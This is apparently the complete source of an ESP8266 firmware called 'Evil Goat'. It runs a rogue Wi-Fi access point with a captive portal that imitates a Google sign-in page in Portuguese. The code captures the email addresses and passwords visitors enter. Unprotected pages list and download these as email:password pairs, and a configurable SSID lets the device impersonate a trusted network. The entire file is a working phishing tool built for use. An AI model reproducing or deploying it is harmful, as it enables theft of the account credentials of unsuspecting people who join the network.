// Evil Goat
// By: trajano (github.com/trajano33)

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// User configuration

#define TITLE "Sign in:"
#define BODY "Use uma Conta Google"
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta está sendo validada. Por favor, aguarde até 5 minutos para conexão do dispositivo.</br>Obrigado."
#define PASS_TITLE "Senhas"
#define CLEAR_TITLE "Limpar"

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

#define SSID_EEPROM_ADDRESS 0  // Endereço EEPROM para armazenar o SSID

String Credentials = "";
String currentSSID = "";  // Variável global para armazenar o SSID
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

void writeSSIDToEEPROM(const String &newSSID) {
  EEPROM.begin(512);
  for (int i = 0; i < newSSID.length(); ++i) {
    EEPROM.write(SSID_EEPROM_ADDRESS + i, newSSID[i]);
  }
  EEPROM.write(SSID_EEPROM_ADDRESS + newSSID.length(), '\0');  // Null-terminate the string
  EEPROM.commit();
  EEPROM.end();
}

String readSSIDFromEEPROM() {
  char ssid[32];  // Assumindo que o SSID pode ter no máximo 32 caracteres
  EEPROM.begin(512);
  int i;
  for (i = 0; i < 32; ++i) {
    char value = EEPROM.read(SSID_EEPROM_ADDRESS + i);
    ssid[i] = value;
    if (value == '\0') {
      break;  // Encerra a leitura quando encontrar o caractere nulo
    }
  }
  ssid[i] = '\0';  // Garante que a string seja null-terminated
  EEPROM.end();
  return String(ssid);
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div></div>";
}

String header(String t, bool showTitle = true) {
  String a = currentSSID;
  String CSS = R"(
    body {
        font-family: 'Arial', sans-serif;
        background-color: #f2f2f2;
        margin: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        height: 100vh;
    }

    .login-container {
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        padding: 20px;
        text-align: center;
        max-width: 400px;
        width: 100%;
        position: relative;
        margin-bottom: 20px;
    }

    .logo {
        font-size: 32px;
        font-weight: bold;
        letter-spacing: -3px;
        margin-top: -10px;
        margin-bottom: 20px;
    }

    .logo span {
        display: inline-block;
        transition: color 0.3s;
    }

    .logo:hover span {
        color: transparent;
    }

    .logo span:nth-child(1) { color: #4285f4; }
    .logo span:nth-child(2) { color: #f44236; }
    .logo span:nth-child(3) { color: #ffd700; }
    .logo span:nth-child(4) { color: #4285f4; }
    .logo span:nth-child(5) { color: #4caf50; }
    .logo span:nth-child(6) { color: #f44236; }

    .subtitle {
        margin-bottom: 20px;
        color: #757575;
    }

    .login-text {
        font-size: 24px;
        font-weight: normal;
        color: #333;
        margin-top: 50px;
        margin-bottom: 20px;
    }

    input {
        width: 100%;
        padding: 12px;
        margin-bottom: 20px;
        box-sizing: border-box;
        border: 1px solid #ccc;
        border-radius: 4px;
        outline: none;
    }

    input:focus {
        border-color: #4285f4;
    }

    .button-container {
        display: flex;
        justify-content: space-between;
    }

    button {
        background-color: #4285f4;
        color: #fff;
        border: none;
        padding: 8px 16px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 14px;
        transition: background-color 0.3s;
    }

    button:hover {
        background-color: #357ae8;
    }

    button.create-account {
        background-color: transparent;
        color: #4285f4;
    }

    .bottom-section {
        color: #757575;
        margin-top: 20px;
        margin-bottom: 30px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        width: 100%;
        font-size: 12px;
    }

    .bottom-section a {
        color: #757575;
        text-decoration: none;
        font-weight: bold;
    }

    .bottom-section a:hover {
        text-decoration: underline;
    }
)";
  String h;
  if (showTitle) {
    h = R"(
<!DOCTYPE html><html>
<head>
    <meta charset="UTF-8">
    <title>)" + t + R"(</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style>)" + CSS + R"(</style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <span>G</span>
            <span>o</span>
            <span>o</span>
            <span>g</span>
            <span>l</span>
            <span>e</span>
        </div>
        <div class="login-text">
            Fazer Login
        </div>
)";
  } else {
    h = R"(
<!DOCTYPE html><html>
<head>
    <meta charset="UTF-8">
    <title>)" + t + R"(</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style>)" + CSS + R"(</style>
</head>
<body>
)";
  }
  return h;
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p><p><a style=\"color:blue\" href=/config>Go to Config</a></p></center>" + footer();
}

void downloadCreds() {
  String filename = "credentials.txt";
  String data = "";

  // Convertendo o formato atual para o novo formato
  int startIdx = 0;
  while (startIdx < Credentials.length()) {
    int emailStart = Credentials.indexOf("<b>", startIdx);
    int emailEnd = Credentials.indexOf("</b>", emailStart);
    int passStart = Credentials.indexOf("<b>", emailEnd);
    int passEnd = Credentials.indexOf("</b>", passStart);

    if (emailStart == -1 || emailEnd == -1 || passStart == -1 || passEnd == -1)
      break;

    String email = Credentials.substring(emailStart + 3, emailEnd);
    String pass = Credentials.substring(passStart + 3, passEnd);

    data += email + ":" + pass + "\n";
    startIdx = passEnd;
  }

  // Enviando o arquivo para download
  webServer.sendHeader("Content-Disposition", "attachment; filename=" + filename);
  webServer.sendHeader("Content-Type", "text/plain");
  webServer.sendHeader("Connection", "close");
  webServer.sendHeader("Content-Length", String(data.length()));
  webServer.send(HTTP_CODE, "text/plain", data);
}

String index() {
  return header(TITLE) + "<div class=\"subtitle\">" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<input type=email name=email placeholder=\"Endereço de e-mail\" required>" +
         "<input type=password name=password placeholder=\"Digite sua senha\" required><button type=button class=\"create-account\">Criar Conta</button><button type=submit>Próximo</button></form>" + footer() + "</div>"
         "<div class=\"bottom-section\">"
             "<span>Português (Brasil)</span>"
             "<a href=\"#\">Ajuda Privacidade Termos</a>"
         "</div>";
}

String config() {
  return header("Configuração") + "<div class=\"subtitle\">Alterar SSID:</div><form action=/saveConfig method=post>" +
         "<input type=text name=newSSID placeholder=\"Novo SSID\" required>" +
         "<button type=submit>Salvar</button></form><br><center><a style=\"color:blue\" href=/creds>Listar Senhas</a></center>" + footer();
}

String posted() {
  String email = input("email");
  String password = input("password");
  Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void saveConfig() {
  String newSSID = input("newSSID");
  if (newSSID.length() > 0) {
    currentSSID = newSSID;
    writeSSIDToEEPROM(currentSSID);
  }
  String savedSSID = readSSIDFromEEPROM();

  String style = R"(
    <style>
      body {
        font-family: 'Arial', sans-serif;
        background-color: #f2f2f2;
        margin: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        height: 100vh;
      }

      .message-container {
        background-color: #fff;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        padding: 20px;
        text-align: center;
        max-width: 400px;
        width: 100%;
        position: relative;
        margin-bottom: 20px;
      }

      .message {
        font-size: 18px;
        color: #333;
        margin-top: 20px;
      }

      .back-link {
        display: inline-block;
        margin-top: 20px;
        padding: 10px 20px;
        background-color: #4285f4;
        color: #fff;
        text-decoration: none;
        border-radius: 4px;
        transition: background-color 0.3s;
      }

      .back-link:hover {
        background-color: #357ae8;
      }

      .restart-button {
        display: inline-block;
        margin-top: 20px;
        padding: 10px 20px;
        background-color: #4285f4;
        color: #fff;
        text-decoration: none;
        border-radius: 4px;
        transition: background-color 0.3s;
      }

      .restart-button:hover {
        background-color: #357ae8;
      }
    </style>
  )";

  String message = "Novo SSID Salvo: " + savedSSID;
  String backLink = "<a href='/config' class='back-link'>Voltar para Configuração</a>";
  String restartButton = "<a href='/restart' class='restart-button'>Reiniciar ESP8266</a>";

  String body = "<div class='message-container'>" + style + "<div class='message'>" + message + "</div>" + backLink + restartButton + "</div>";

  webServer.send(HTTP_CODE, "text/html; charset=utf-8", body);
}

void BLINK() {
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  webServer.on("/downloadCreds", HTTP_GET, []() { downloadCreds(); });


  bootTime = lastActivity = millis();

  WiFi.mode(WIFI_AP);

  currentSSID = readSSIDFromEEPROM();

  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(currentSSID.c_str());

  dnsServer.start(DNS_PORT, "*", APIP);
  
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/creds", []() {
  webServer.send(HTTP_CODE, "text/html", 
    header("Evil Goat", false) +
    "<style>" +
    "  body { font-family: 'Baskerville', serif; background-color: #333; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; flex-direction: column; height: 100vh; }" +
    "  h1 { font-family: 'Baskerville', serif; color: #a31414 !important; /* Adicione !important para garantir que o estilo seja aplicado */ }" +
    "  ol { color: #fff; }" +
    "  a { color: #4285f4; text-decoration: none; }" +
    "  a:hover { text-decoration: underline; }" +
    "</style>" +
    "<h1>Evil Goat</h1>" +
    "<ol>" + Credentials + "</ol><br><center>" +
    "<p><a href=/>Voltar para o Índice</a></p>" +
    "<p><a href=/config>Ir para Configuração</a></p>" +\
    "<p><a href=/downloadCreds>Download Passwords</a></p>" +
    "</center>" + footer());
});
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.on("/config", []() {
  webServer.send(HTTP_CODE, "text/html", 
    header("Evil Goat", false) +
    "<style>" +
    "  body { font-family: 'Baskerville', serif; background-color: #333; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; flex-direction: column; height: 100vh; }" +
    "  h1 { font-family: 'Baskerville', serif; color: #a31414 !important; /* Adicione !important para garantir que o estilo seja aplicado */ }" +
    "  form { color: #fff; }" +
    "  input, button { background-color: #4285f4; color: #fff; }" +
    "  input:focus { border-color: #fff; }" +
    "  input#newSSID { /* Adicione esta linha para estilizar a caixa de 'Novo SSID' */" +
    "    background-color: #fff; /* Defina a cor de fundo para branco */" +
    "    color: #333 !important; /* Defina a cor do texto para preto ou outra cor visível */" +
    "  }" +
    "  a { color: #4285f4; text-decoration: none; }" +
    "  a:hover { text-decoration: underline; }" +
    "  @media (prefers-color-scheme: dark) {" +
    "    body { background-color: #333; color: #fff; }" +
    "    h1, ol, a { color: #fff; }" +
    "    input, button { background-color: #4285f4; color: #fff; }" +
    "    input:focus { border-color: #fff; }" +
    "    input#newSSID { /* Adicione esta linha para estilizar a caixa de 'Novo SSID' no modo escuro */" +
    "      background-color: #yourDarkColor; /* Substitua 'yourDarkColor' pela cor desejada no modo escuro */" +
    "      color: #fff; /* Defina a cor do texto para branco ou outra cor visível no modo escuro */" +
    "    }" +
    "  }" +
    "</style>" +
    "<center>" +
    "<h1>Evil Goat</h1>" +
    "<div class=\"subtitle\">Alterar SSID:</div>" +
    "<form action=/saveConfig method=post>" +
    "<input type=text name=newSSID id=newSSID placeholder=\"Novo SSID\" required>" +
    "<button type=submit>Salvar</button>" +
    "</form>" +
    "<a style=\"color:blue\" href=/creds>Listar Senhas</a>" +
    "</center>" + footer());
});
  webServer.on("/saveConfig", HTTP_POST, []() {
  String newSSID = input("newSSID");
  if (newSSID.length() > 0) {
    currentSSID = newSSID;
    writeSSIDToEEPROM(currentSSID);
  }
  String savedSSID = readSSIDFromEEPROM();

  webServer.send(HTTP_CODE, "text/html", 
    header("Evil Goat - Configuração", false) +
"<style>" +
    "  body { font-family: 'Baskerville', serif; background-color: #333; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; flex-direction: column; height: 100vh; }" +
    "  h1 { font-family: 'Baskerville', serif; color: #a31414 !important; /* Adicione !important para garantir que o estilo seja aplicado */ }" +
    "  .message-container { background-color: transparent; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); padding: 20px; text-align: center; max-width: 400px; width: 100%; position: relative; margin-bottom: 20px; }" +
    "  .message { font-size: 18px; color: #fff; margin-top: 20px; }" +
    "  .back-link { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #4285f4; color: #fff; text-decoration: none; border-radius: 4px; transition: background-color 0.3s; }" +
    "  .back-link:hover { background-color: #357ae8; }" +
    "  .restart-button { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #4285f4; color: #fff; text-decoration: none; border-radius: 4px; transition: background-color 0.3s; }" +
    "  .restart-button:hover { background-color: #357ae8; }" +
    "</style>" +
    "<div class='message-container'>" +
    "<div class='message'>Novo SSID Salvo: <span style='color: #fff;'>" + savedSSID + "</span></div>" +
    "<a href='/config' class='back-link'>Voltar para Configuração</a>" +
    "<a href='/restart' class='restart-button'>Reiniciar ESP8266</a>" +
    "</div>" + footer());
});
  webServer.on("/restart", HTTP_GET,[]() { 
  webServer.send(HTTP_CODE, "text/html", 
    header("Evil Goat - Reiniciar", false) +
    "<style>" +
    "  body { font-family: 'Baskerville', serif; background-color: #333; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; flex-direction: column; height: 100vh; }" +
    "  .message-container { background-color: transparent; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); padding: 20px; text-align: center; max-width: 400px; width: 100%; position: relative; margin-bottom: 20px; }" +
    "  .message { font-size: 18px; color: #fff; margin-top: 20px; }" +  // Alteração da cor do texto para branco
    "  .back-link { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #4285f4; color: #fff; text-decoration: none; border-radius: 4px; transition: background-color 0.3s; }" +
    "  .back-link:hover { background-color: #357ae8; }" +
    "  .restart-button { display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #4285f4; color: #fff; text-decoration: none; border-radius: 4px; transition: background-color 0.3s; }" +
    "  .restart-button:hover { background-color: #357ae8; }" +
    "</style>" +
    "<div class='message-container'>" +
    "<div class='message'>Reiniciando ESP8266...</div>" +
    "<a href='/config' class='back-link'>Voltar para Configuração</a>" +
    "</div>" +
    footer());
  webServer.send(HTTP_CODE, "text/html", restart());
});

  webServer.onNotFound([]() { lastActivity = millis(); webServer.send(HTTP_CODE, "text/html", index()); });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}

String restart() {
  String body = "<div class='message-container'>"
                "<style>"
                "  body {font-family: 'Arial', sans-serif;background-color: #f2f2f2;margin: 0;display: flex;align-items: center;justify-content: center;flex-direction: column;height: 100vh;}"
                "  .message-container {background-color: #fff;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);padding: 20px;text-align: center;max-width: 400px;width: 100%;position: relative;margin-bottom: 20px;}"
                "  .message {font-size: 18px;color: #333;margin-top: 20px;}"
                "  .back-link {display: inline-block;margin-top: 20px;padding: 10px 20px;background-color: #4285f4;color: #fff;text-decoration: none;border-radius: 4px;transition: background-color 0.3s;}"
                "  .back-link:hover {background-color: #357ae8;}"
                "  .restart-button {display: inline-block;margin-top: 20px;padding: 10px 20px;background-color: #4285f4;color: #fff;text-decoration: none;border-radius: 4px;transition: background-color 0.3s;}"
                "  .restart-button:hover {background-color: #357ae8;}"
                "</style>"
                "<div class='message-container'>"
                "<div class='message'>Reiniciando ESP8266...</div>"
                "<a href='/config' class='back-link'>Voltar para Configuração</a>"
                "</div>";

  webServer.send(HTTP_CODE, "text/html; charset=utf-8", body);
  delay(1000);
  ESP.reset();
  return "";
}


